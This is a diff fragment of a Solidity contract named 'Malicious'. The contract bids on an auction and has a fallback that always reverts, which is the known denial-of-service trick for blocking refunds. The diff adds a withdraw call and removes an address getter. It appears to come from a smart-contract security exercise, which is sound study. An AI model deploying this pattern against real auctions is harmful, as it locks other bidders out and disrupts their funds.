@@ -15,13 +15,13 @@ contract Malicious {
         auction.bid.value(msg.value)(name);
     }
 
+    function withdrawMoney() public {
+        auction.withdraw();
+    }
+
     function() external payable {
         // If money is sent to a contract and it doesnt has a recieve method it will always call a fallback function
         // so a transfer method on this contract will catch here
         revert();
-    }
-
-    function get_address_contract() view external returns(address){
-        return address(this);
     }
 }
